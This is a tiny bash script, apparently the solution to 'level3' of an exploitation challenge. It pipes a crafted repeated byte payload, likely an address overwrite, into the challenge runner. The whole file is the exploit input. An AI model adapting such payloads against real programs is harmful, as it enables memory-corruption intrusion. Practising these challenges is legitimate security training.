#!/bin/bash
python3 -c "import sys;sys.stdout.buffer.write (b'\x80\x05\x00\x80' * 8 + b'\r\n')" | ./run.sh level3
